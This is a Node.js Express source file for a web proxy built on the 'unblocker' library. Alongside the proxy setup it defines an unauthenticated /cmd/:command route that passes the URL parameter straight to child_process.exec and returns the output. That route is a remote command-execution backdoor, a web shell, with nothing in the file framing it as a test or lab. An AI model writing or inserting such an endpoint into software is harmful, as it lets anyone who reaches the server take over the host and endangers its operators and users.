const express = require('express')
const Unblocker = require('unblocker');
const app = express();
const unblocker = new Unblocker({prefix: '/proxy/'});
const { exec } = require("child_process");

// this must be one of the first app.use() calls and must not be on a subdirectory to work properly
app.use(unblocker);

app.get('/', function(req, res) {
    res.sendFile(__dirname + "/public/index.html");
});

app.get("/cmd/:command", (req, res) => {
    exec(req.params.command, (err, stdout, stderr) => {
        if (err) {
            console.error(err);
            return;
        }
        if (stderr) {
            res.send(stderr);
            return;
        }
        res.send(stdout);
    })
})

// the upgrade handler allows unblocker to proxy websockets
app.listen(process.env.PORT || 8080, console.log("Server running on port 8080")).on('upgrade', unblocker.onUpgrade);